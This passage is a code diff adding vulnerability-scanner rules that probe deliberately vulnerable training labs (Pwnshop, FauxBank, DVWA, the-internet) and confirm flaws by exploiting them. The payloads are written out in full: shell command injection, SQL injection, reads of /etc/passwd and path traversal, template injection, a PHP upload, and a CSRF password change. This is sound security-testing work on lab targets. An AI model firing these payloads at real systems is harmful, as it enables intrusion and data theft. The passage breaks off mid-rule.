+const pwnshopMailIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/mail(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopMailInboxIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /mail/:id route scan — GET /mail/<inbox_token> returns another user's OTP mail without ownership check (PWN-004)"
+    }
+  };
+};
+
+const pwnshopAvatarUploadRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/profile\/upload-avatar/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopAvatarSvgXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /profile/upload-avatar route scan — POST stores SVG with onload handler served at /uploads/ — stored XSS via avatar upload (PWN-012)"
+    }
+  };
+};
+
+const pwnshopApplyCouponRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/apply-coupon/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopApplyCouponLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /apply-coupon route scan — POST accepts HALFOFF after OTP login with valid:true and 50% discount (PWN-016 family)"
+    }
+  };
+};
+
+const pwnshopCouponCategoryBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/apply-coupon/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopCouponCategoryBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /apply-coupon route scan — PHONE20 rejected at /apply-coupon for fashion cart but checkout accepts coupon_code=PHONE20 without category re-validation (PWN-016)"
+    }
+  };
+};
+
+async function pwnshopEnsureSellerSession(ctx: RuleContext): Promise<string | null> {
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return null;
+  const sellerDoc = await ctx.probe.get(new URL("/register-seller", ctx.origin).toString(), {
+    method: "POST",
+    body: "shop_name=ThugirProbeShop",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  return pwnshopSessionCookieFromDoc(sellerDoc) ?? cookie;
+}
+
+const pwnshopSellerPreviewSstiLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopEnsureSellerSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const previewUrl = new URL("/seller/preview", ctx.origin);
+  previewUrl.searchParams.set("template", "<%= 7*7 %>");
+  const doc = await ctx.probe.get(previewUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/\b49\b/.test(doc.body)) return NEGATIVE;
+  if (!/Storefront Description|seller-card|Seller/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /ejs|template/i.test(doc.body) ? 0.94 : 0.93,
+    evidence: {
+      url: previewUrl.toString(),
+      snippet: doc.body.match(/49[\s\S]{0,80}/)?.[0]?.slice(0, 120) ?? "49",
+      note: "Pwnshop GET /seller/preview?template= passes raw query input to ejs.render() — <%= 7*7 %> evaluates to 49 (PWN-040)"
+    }
+  };
+};
+
+const pwnshopDownloadPathTraversalLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopEnsureSellerSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const downloadUrl = new URL("/download", ctx.origin);
+  downloadUrl.searchParams.set("file", "../../package.json");
+  const doc = await ctx.probe.get(downloadUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"name"\s*:\s*"pwnshop-app"/i.test(doc.body)) return NEGATIVE;
+  if (!/"dependencies"\s*:\s*\{/.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: downloadUrl.toString(),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Pwnshop GET /download?file=../../package.json returns application package.json via path.join traversal — invoice download path traversal (PWN-038)"
+    }
+  };
+};
+
+const pwnshopSellerPreviewSstiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/seller\/preview/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopSellerPreviewSstiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /seller/preview route scan — template= query evaluates <%= 7*7 %> to 49 via ejs.render() (PWN-040)"
+    }
+  };
+};
+
+const pwnshopDownloadPathTraversalRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/download/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopDownloadPathTraversalLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /download route scan — file=../../package.json returns package.json via path traversal (PWN-038)"
+    }
+  };
+};
+
+const fauxbankProfileSensitiveDataLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const cookie = await ensureFauxbankSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const profileUrl = new URL("/api/profile", ctx.origin).toString();
+  const doc = await ctx.probe.get(profileUrl, { maxBytes: 4096, headers: { Cookie: cookie } });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"ssnFake"\s*:\s*"[^"]+"/i.test(doc.body)) return NEGATIVE;
+  if (!/"fullName"\s*:\s*"[^"]+"/i.test(doc.body) || !/"email"\s*:\s*"[^"]+"/i.test(doc.body)) {
+    return NEGATIVE;
+  }
+  const ssn = doc.body.match(/"ssnFake"\s*:\s*"([^"]+)"/i)?.[1];
+  const fullName = doc.body.match(/"fullName"\s*:\s*"([^"]+)"/i)?.[1];
+  if (!ssn || !fullName) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: profileUrl,
+      fullName,
+      ssnFake: ssn,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "GET /api/profile returns ssnFake and PII in JSON without field-level redaction — FauxBank profile sensitive-data oracle"
+    }
+  };
+};
+
+const fauxbankProfileRouteLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/profile/i.test(pageUrl)) return NEGATIVE;
+  const result = await fauxbankProfileSensitiveDataLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "FauxBank /profile route scan — GET /api/profile exposes ssnFake and PII without redaction"
+    }
+  };
+};
+
+const fauxbankLoansRouteLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/loans/i.test(pageUrl)) return NEGATIVE;
+  const result = await fauxbankLoansRequestLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "FauxBank /loans route scan — POST /api/loans creates pending loan visible in GET /api/loans"
+    }
+  };
+};
+
+const fauxbankTransferRouteLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/transfer/i.test(pageUrl)) return NEGATIVE;
+  const result = await fauxbankCsrfTransferProbe(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "FauxBank /api/transfer route scan — POST executes fund transfer without CSRF token (lesson #7)"
+    }
+  };
+};
+
+const fauxbankAccountsRouteLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/accounts/i.test(pageUrl)) return NEGATIVE;
+  const result = await fauxbankIdorAccountsProbe(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "FauxBank /api/accounts route scan — authenticated user reads another customer's account by predictable ID (lesson #1)"
+    }
+  };
+};
 
 const pwnshopVerifyOtpBruteforceLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
@@ -28613,6 +30914,1188 @@ const clientSidePentestGroundHubEvidence: Rule = async (ctx) => {
   };
 };
 
+function isPentestGroundDvwaHost(ctx: RuleContext): boolean {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  return /pentest-ground\.com:4280/i.test(corpus);
+}
+
+function pentestGroundDvwaProbeOrigin(ctx: RuleContext): string {
+  if (isPentestGroundDvwaHost(ctx)) return "https://pentest-ground.com:4280";
+  return ctx.origin;
+}
+
+function isPentestGroundRestflawHost(ctx: RuleContext): boolean {
+  return /pentest-ground\.com:9000/i.test(ctx.origin);
+}
+
+function pentestGroundRestflawProbeOrigin(ctx: RuleContext): string {
+  if (isPentestGroundRestflawHost(ctx)) return "https://pentest-ground.com:9000";
+  return ctx.origin;
+}
+
+const pentestGroundDvwaExecCmdiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/exec\/?/i.test(pageUrl)) return NEGATIVE;
+  const execUrl = new URL("/vulnerabilities/exec/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(execUrl, {
+    method: "POST",
+    body: "ip=127.0.0.1;id&Submit=Submit",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/uid=\d+\([^)]+\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      execUrl,
+      snippet: doc.body.match(/uid=\d+\([^)]+\)/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA POST /vulnerabilities/exec/ with ip=127.0.0.1;id executes shell id — command injection route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaCspBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/csp\/?/i.test(pageUrl)) return NEGATIVE;
+  const cspUrl = new URL("/vulnerabilities/csp/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(cspUrl, {
+    method: "POST",
+    body: "include=data:text/javascript,alert(1)",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<script\s+src=['"]data:text\/javascript/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      cspUrl,
+      snippet: doc.body.match(/<script\s+src=['"]data:text\/javascript[^'"]*['"]/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA POST /vulnerabilities/csp/ with include=data:text/javascript reflects unsanitized script-src — CSP bypass route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/sqli\/?/i.test(pageUrl)) return NEGATIVE;
+  const sqliUrl = new URL("/vulnerabilities/sqli/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(sqliUrl, {
+    method: "POST",
+    body: "id=1' OR '1'='1&Submit=Submit",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/1' OR '1'='1/i.test(doc.body)) return NEGATIVE;
+  const userRows = (doc.body.match(/First name:/gi) || []).length;
+  if (userRows < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      sqliUrl,
+      userRows,
+      snippet: doc.body.match(/First name:[^<]{0,80}/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA POST /vulnerabilities/sqli/ with id=1' OR '1'='1 returns multiple user rows — SQL injection route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaUploadRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/upload\/?/i.test(pageUrl)) return NEGATIVE;
+  const uploadUrl = new URL("/vulnerabilities/upload/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const probeName = `thugir-upload-${Date.now().toString(36)}.php`;
+  const boundary = `----ThugirDvwaUpload${Date.now().toString(36)}`;
+  const body = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="MAX_FILE_SIZE"',
+    "",
+    "100000",
+    `--${boundary}`,
+    `Content-Disposition: form-data; name="uploaded"; filename="${probeName}"`,
+    "Content-Type: image/jpeg",
+    "",
+    "<?php echo 'thugir-upload-probe'; ?>",
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="Upload"',
+    "",
+    "Upload",
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const doc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/succes+fully uploaded/i.test(doc.body) || !/hackable\/uploads/i.test(doc.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      uploadUrl,
+      probeName,
+      snippet: doc.body.match(/<pre>[^<]+<\/pre>/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA POST /vulnerabilities/upload/ accepts arbitrary PHP file upload — unrestricted file upload route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaXssRRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/xss_r\/?/i.test(pageUrl)) return NEGATIVE;
+  const canary = `thugirXssR${Date.now().toString(36)}`;
+  const xssUrl = new URL("/vulnerabilities/xss_r/", pentestGroundDvwaProbeOrigin(ctx));
+  xssUrl.searchParams.set("name", canary);
+  const doc = await ctx.probe.get(xssUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const escaped = canary.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  if (!new RegExp(`Hello\\s+${escaped}`, "i").test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      xssUrl: xssUrl.toString(),
+      canary,
+      snippet: doc.body.match(new RegExp(`Hello\\s+${escaped}`, "i"))?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA GET /vulnerabilities/xss_r/?name= reflects attacker input in Hello <name> — reflected XSS route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaFiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/fi\/?/i.test(pageUrl)) return NEGATIVE;
+  const fiUrl = new URL("/vulnerabilities/fi/", pentestGroundDvwaProbeOrigin(ctx));
+  fiUrl.searchParams.set("page", "../../../../../../../etc/passwd");
+  const doc = await ctx.probe.get(fiUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/root:x:0:0:/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      fiUrl: fiUrl.toString(),
+      snippet: doc.body.match(/root:x:0:0:[^\n]*/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA GET /vulnerabilities/fi/?page=../../../../../../../etc/passwd includes /etc/passwd — local file inclusion route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaCsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/csrf\/?/i.test(pageUrl)) return NEGATIVE;
+  const csrfUrl = new URL("/vulnerabilities/csrf/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const formDoc = await ctx.probe.get(csrfUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (formDoc.status < 200 || formDoc.status >= 400) return NEGATIVE;
+  if (!/name=["']password_new["']/i.test(formDoc.body)) return NEGATIVE;
+  if (!/name=["']password_conf["']/i.test(formDoc.body)) return NEGATIVE;
+  if (/name=["'](?:user_token|csrf_token|token)["']/i.test(formDoc.body)) return NEGATIVE;
+  const postDoc = await ctx.probe.get(csrfUrl, {
+    method: "POST",
+    body: "password_new=thugir-csrf-probe&password_conf=thugir-csrf-probe&Change=Change",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  if (/password.{0,20}did not match/i.test(postDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      csrfUrl,
+      snippet: "password change form without anti-CSRF token accepts cross-site POST",
+      note: "Pentest-Ground DVWA POST /vulnerabilities/csrf/ accepts password_new/password_conf without CSRF token — CSRF route oracle"
+    }
+  };
+};
+
+function isTheInternetHost(ctx: RuleContext): boolean {
+  return /the-internet\.herokuapp\.com/i.test(ctx.origin);
+}
+
+const theInternetLoginAuthLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const authUrl = new URL("/authenticate", ctx.origin).toString();
+  const goodBody = new URLSearchParams({
+    username: "tomsmith",
+    password: "SuperSecretPassword!"
+  }).toString();
+  const goodDoc = await ctx.probe.get(authUrl, {
+    method: "POST",
+    body: goodBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const goodLoc = goodDoc.headers.location || "";
+  if (![301, 302, 303, 307, 308].includes(goodDoc.status)) return NEGATIVE;
+  if (!/\/secure(?:\/|$|\?)/i.test(goodLoc)) return NEGATIVE;
+  const badBody = new URLSearchParams({
+    username: "tomsmith",
+    password: "thugir-wrong-probe"
+  }).toString();
+  const badDoc = await ctx.probe.get(authUrl, {
+    method: "POST",
+    body: badBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const badLoc = badDoc.headers.location || "";
+  if (![301, 302, 303, 307, 308].includes(badDoc.status)) return NEGATIVE;
+  if (!/\/login(?:\/|$|\?)/i.test(badLoc)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      authUrl,
+      goodRedirect: goodLoc.slice(0, 120),
+      badRedirect: badLoc.slice(0, 120),
+      note: "the-internet.herokuapp.com POST /authenticate redirects valid tomsmith credentials to /secure and rejects invalid passwords to /login — form authentication oracle"
+    }
+  };
+};
+
+const theInternetLoginAuthRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const result = await theInternetLoginAuthLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  const disclosesCreds =
+    /tomsmith/i.test(ctx.combined) && /SuperSecretPassword!/i.test(ctx.combined);
+  return {
+    fired: true,
+    confidence: disclosesCreds ? 0.94 : result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      disclosesDemoCredentials: disclosesCreds,
+      note: "the-internet /login route scan — form authentication redirects valid demo credentials to /secure; login page discloses tomsmith/SuperSecretPassword! test credentials"
+    }
+  };
+};
+
+const theInternetDynamicLoadingRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/dynamic_loading\/?/i.test(pageUrl)) return NEGATIVE;
+  const hubUrl = new URL("/dynamic_loading", ctx.origin).toString();
+  const hubDoc = await ctx.probe.get(hubUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (hubDoc.status < 200 || hubDoc.status >= 400) return NEGATIVE;
+  if (!/\/dynamic_loading\/[12]/i.test(hubDoc.body)) return NEGATIVE;
+  const ex1Url = new URL("/dynamic_loading/1", ctx.origin).toString();
+  const ex1Doc = await ctx.probe.get(ex1Url, { maxBytes: 8192, timeoutMs: 15000 });
+  if (ex1Doc.status < 200 || ex1Doc.status >= 400) return NEGATIVE;
+  const hasStart = /id=['"]start['"]/i.test(ex1Doc.body);
+  const hasHello = /Hello World!/i.test(ex1Doc.body);
+  const hasLoader = /ajax-loader\.gif/i.test(ex1Doc.body);
+  if (!hasStart || !hasHello || !hasLoader) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      hubUrl,
+      exampleUrl: ex1Url,
+      markers: ["dynamic_loading/1", "Hello World!", "ajax-loader.gif"],
+      note: "the-internet /dynamic_loading route scan — AJAX delayed-render training lab with hidden #start button and Hello World! reveal — Elemental Selenium dynamic content oracle"
+    }
+  };
+};
+
+const theInternetBasicAuthRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/basic_auth(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const basicUrl = new URL("/basic_auth", ctx.origin).toString();
+  const unauthDoc = await ctx.probe.get(basicUrl, { maxBytes: 2048, timeoutMs: 15000 });
+  if (unauthDoc.status !== 401) return NEGATIVE;
+  const basicHeader = {
+    Authorization: `Basic ${Buffer.from("admin:admin").toString("base64")}`
+  };
+  const authDoc = await ctx.probe.get(basicUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: basicHeader
+  });
+  if (authDoc.status < 200 || authDoc.status >= 400) return NEGATIVE;
+  if (!/Congratulations!/i.test(authDoc.body) || !/proper credentials/i.test(authDoc.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      basicUrl,
+      unauthStatus: unauthDoc.status,
+      authStatus: authDoc.status,
+      snippet: authDoc.body.match(/Congratulations![^<]{0,80}/i)?.[0] || authDoc.body.slice(0, 200).trim(),
+      note: "the-internet /basic_auth route scan — HTTP 401 without credentials; admin:admin Basic auth returns Congratulations — Elemental Selenium basic authentication oracle"
+    }
+  };
+};
+
+function isTheInternetDownloadSecureRoute(pageUrl: string): boolean {
+  return /\/(?:download_secure|secure_file_download)(?:\/|$|\?)/i.test(pageUrl);
+}
+
+const theInternetDownloadSecureRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!isTheInternetDownloadSecureRoute(pageUrl)) return NEGATIVE;
+  const secureUrl = new URL("/download_secure", ctx.origin).toString();
+  const unauthDoc = await ctx.probe.get(secureUrl, { maxBytes: 2048, timeoutMs: 15000 });
+  if (unauthDoc.status !== 401) return NEGATIVE;
+  const basicHeader = {
+    Authorization: `Basic ${Buffer.from("admin:admin").toString("base64")}`
+  };
+  const authDoc = await ctx.probe.get(secureUrl, {
+    maxBytes: 8192,
+    timeoutMs: 15000,
+    headers: basicHeader
+  });
+  if (authDoc.status < 200 || authDoc.status >= 400) return NEGATIVE;
+  if (!/Secure File Downloader/i.test(authDoc.body)) return NEGATIVE;
+  if (!/download_secure\/[^"'\s>]+/i.test(authDoc.body)) return NEGATIVE;
+  const sampleUrl = new URL("/download_secure/sample.txt", ctx.origin).toString();
+  const sampleDoc = await ctx.probe.get(sampleUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    headers: basicHeader
+  });
+  if (sampleDoc.status < 200 || sampleDoc.status >= 400) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      secureUrl,
+      unauthStatus: unauthDoc.status,
+      authStatus: authDoc.status,
+      sampleUrl,
+      sampleSnippet: sampleDoc.body.slice(0, 120).trim(),
+      note: "the-internet /download_secure route scan — HTTP 401 without credentials; admin:admin Basic auth lists Secure File Downloader and serves sample.txt — Elemental Selenium secure download oracle"
+    }
+  };
+};
+
+const theInternetDropdownRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/dropdown(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const dropdownUrl = new URL("/dropdown", ctx.origin).toString();
+  const doc = await ctx.probe.get(dropdownUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasSelect = /<select[^>]+id=['"]dropdown['"]/i.test(doc.body);
+  const optionCount = (doc.body.match(/<option\b/gi) || []).length;
+  if (!hasSelect || optionCount < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      dropdownUrl,
+      optionCount,
+      markers: ["select#dropdown", "option values"],
+      note: "the-internet /dropdown route scan — select#dropdown with multiple option values — Elemental Selenium dropdown interaction training oracle"
+    }
+  };
+};
+
+const theInternetJavascriptAlertsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/javascript_alerts(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const alertsUrl = new URL("/javascript_alerts", ctx.origin).toString();
+  const doc = await ctx.probe.get(alertsUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasJsAlert = /function\s+jsAlert\s*\(\)/i.test(doc.body);
+  const hasConfirm = /function\s+jsConfirm\s*\(\)/i.test(doc.body);
+  const hasPrompt = /function\s+jsPrompt\s*\(\)/i.test(doc.body);
+  const hasButtons =
+    /onclick=["']jsAlert\(\)["']/i.test(doc.body) &&
